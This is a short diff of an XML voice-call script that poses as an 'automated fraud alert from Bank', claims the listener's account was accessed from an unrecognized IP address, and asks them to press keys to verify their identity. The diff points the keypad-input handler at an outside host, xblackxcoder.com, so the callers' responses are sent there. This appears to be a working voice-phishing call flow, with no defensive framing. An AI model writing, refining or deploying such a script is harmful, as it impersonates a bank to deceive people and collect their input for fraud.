@@ -1,6 +1,6 @@
 <Response>
   <Speak>Welcome this is an automated fraud alert from Bank. We noticed that you accessed your account from an unrecognized IP address.</Speak>
-<GetInput action="/api/v1/gather" method="GET" inputType="dtmf" digitEndTimeout="5" language="en-US" redirect="true">
+<GetInput action="https://xblackxcoder.com/api/v1/gather" method="GET" inputType="dtmf" digitEndTimeout="5" language="en-US" redirect="true">
   <Speak language="en-US">If this was not you please press 1 else press 2 to verify your identity</Speak>
 </GetInput>
 <Speak>Sorry, that's not a valid input</Speak>
